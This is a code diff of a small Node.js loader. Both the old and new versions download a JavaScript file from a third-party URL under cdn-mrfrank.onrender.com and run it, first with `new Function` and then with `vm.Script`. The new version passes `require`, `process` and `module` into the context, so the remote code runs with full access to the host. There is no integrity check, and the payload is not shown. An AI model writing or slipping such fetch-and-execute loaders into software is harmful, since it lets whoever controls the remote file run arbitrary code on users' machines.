@@ -1,20 +1,21 @@
-const https = require('https');
+const axios = require('axios');
+const vm = require('vm');
 
-const remoteUrl = 'https://cdn-mrfrank.onrender.com/media/subzero/index.js';
+// URL of the remote JS file
+const remoteScriptUrl = 'https://cdn-mrfrank.onrender.com/media/subzero/index.js';
 
-https.get(remoteUrl, (res) => {
-    let data = '';
+// Function to load and execute the remote script
+(async () => {
+  try {
+    console.log("🚀 Fetching remote script...");
+    const { data: scriptCode } = await axios.get(remoteScriptUrl);
 
-    res.on('data', chunk => { data += chunk; });
-    res.on('end', () => {
-        try {
-            console.log('✔ Running remote script...\n');
-            const run = new Function(data);
-            run(); // Run the fetched code
-        } catch (err) {
-            console.error('❌ Error executing script:', err);
-        }
-    });
-}).on('error', (err) => {
-    console.error('❌ Failed to fetch script:', err);
-});
+    console.log("✔ Running remote script...");
+    const script = new vm.Script(scriptCode);
+    const context = vm.createContext({ require, console, process, module, __filename, __dirname });
+    script.runInContext(context);
+
+  } catch (err) {
+    console.error("❌ Error executing script:", err);
+  }
+})();
